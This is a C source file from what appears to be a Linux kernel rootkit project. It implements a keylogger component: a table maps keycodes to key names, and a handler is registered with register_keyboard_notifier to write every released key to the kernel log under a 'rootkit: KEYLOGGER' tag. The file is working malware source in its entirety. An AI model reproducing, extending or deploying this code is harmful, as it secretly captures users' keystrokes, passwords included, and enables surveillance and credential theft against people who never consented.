#include "header/keylogger.h"



/*
 * Index of each string in the array = its keycode
 */
const char *const keycode_map[] = {
        "KEY_RESERVED", 
        "KEY_ESC", 
        "KEY_1", 
        "KEY_2", 
        "KEY_3", 
        "KEY_4", 
        "KEY_5", 
        "KEY_6", 
        "KEY_7", 
        "KEY_8", 
        "KEY_9", 
        "KEY_0", 
        "KEY_MINUS", 
        "KEY_EQUAL", 
        "KEY_BACKSPACE", 
        "KEY_TAB", 
        "KEY_Q", 
        "KEY_W", 
        "KEY_E", 
        "KEY_R", 
        "KEY_T", 
        "KEY_Y", 
        "KEY_U", 
        "KEY_I", 
        "KEY_O", 
        "KEY_P", 
        "KEY_LEFTBRACE", 
        "KEY_RIGHTBRACE", 
        "KEY_ENTER", 
        "KEY_LEFTCTRL", 
        "KEY_A", 
        "KEY_S", 
        "KEY_D", 
        "KEY_F", 
        "KEY_G", 
        "KEY_H", 
        "KEY_J", 
        "KEY_K", 
        "KEY_L", 
        "KEY_SEMICOLON", 
        "KEY_APOSTROPHE", 
        "KEY_GRAVE", 
        "KEY_LEFTSHIFT", 
        "KEY_BACKSLASH", 
        "KEY_Z", 
        "KEY_X", 
        "KEY_C", 
        "KEY_V", 
        "KEY_B", 
        "KEY_N", 
        "KEY_M", 
        "KEY_COMMA", 
        "KEY_DOT", 
        "KEY_SLASH", 
        "KEY_RIGHTSHIFT", 
        "KEY_KPASTERISK", 
        "KEY_LEFTALT", 
        "KEY_SPACE", 
        "KEY_CAPSLOCK", 
        "KEY_F1", 
        "KEY_F2", 
        "KEY_F3", 
        "KEY_F4", 
        "KEY_F5", 
        "KEY_F6", 
        "KEY_F7", 
        "KEY_F8", 
        "KEY_F9", 
        "KEY_F10", 
        "KEY_NUMLOCK", 
        "KEY_SCROLLLOCK", 
        "KEY_KP7", 
        "KEY_KP8", 
        "KEY_KP9", 
        "KEY_KPMINUS", 
        "KEY_KP4", 
        "KEY_KP5", 
        "KEY_KP6", 
        "KEY_KPPLUS", 
        "KEY_KP1", 
        "KEY_KP2", 
        "KEY_KP3", 
        "KEY_KP0", 
        "KEY_KPDOT",
        NULL,
        "KEY_ZENKAKUHANKAKU",
        "KEY_102ND",
        "KEY_F11",
        "KEY_F12",
        "KEY_RO",
        "KEY_KATAKANA",
        "KEY_HIRAGANA",
        "KEY_HENKAN",
        "KEY_KATAKANAHIRAGANA",
        "KEY_MUHENKAN",
        "KEY_KPJPCOMMA",
        "KEY_KPENTER",
        "KEY_RIGHTCTRL",
        "KEY_KPSLASH",
        "KEY_SYSRQ",
        "KEY_RIGHTALT",
        "KEY_LINEFEED",
        "KEY_HOME",
        "KEY_UP",
        "KEY_PAGEUP",
        "KEY_LEFT",
        "KEY_RIGHT",
        "KEY_END",
        "KEY_DOWN",
        "KEY_PAGEDOWN",
        "KEY_INSERT",
        "KEY_DELETE",
        "KEY_MACRO",
        "KEY_MUTE",
        "KEY_VOLUMEDOWN",
        "KEY_VOLUMEUP",
        "KEY_POWER",
        "KEY_KPEQUAL",
        "KEY_KPPLUSMINUS",
        "KEY_PAUSE",
        "KEY_SCALE"
};


/*
 * After pressing any key this function handles the event.
 * TODO: Add keyboard state structure (caps, shift, etc.)
 */
static int notify_handler(struct notifier_block *nblock, unsigned long code, void *inparam) {
    struct keyboard_notifier_param *param = inparam;

    if (code == KBD_KEYCODE && !param->down)
        printk("rootkit: KEYLOGGER %s pressed(keycode %i)\n", 
            param->value < 121 ? keycode_map[param->value] : "", param->value);

    return 1;
}


/*
 * Register keyboard event handler.
 */
static struct notifier_block keyboard_handler = {
    .notifier_call = notify_handler
};


void keylogger(void) {
    register_keyboard_notifier(&keyboard_handler);
}